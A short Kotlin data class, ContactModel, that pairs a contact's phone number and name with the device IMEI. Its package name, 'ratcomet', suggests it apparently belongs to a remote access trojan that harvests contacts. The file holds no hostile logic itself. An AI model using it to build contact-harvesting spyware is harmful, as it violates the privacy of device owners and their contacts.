package ug.hix.ratcomet.model

import ug.hix.ratcomet.util.CometUtil

data class ContactModel(
    val phoneNumber : String,
    val imei : String = CometUtil.getImei(),
    val name: String,
)
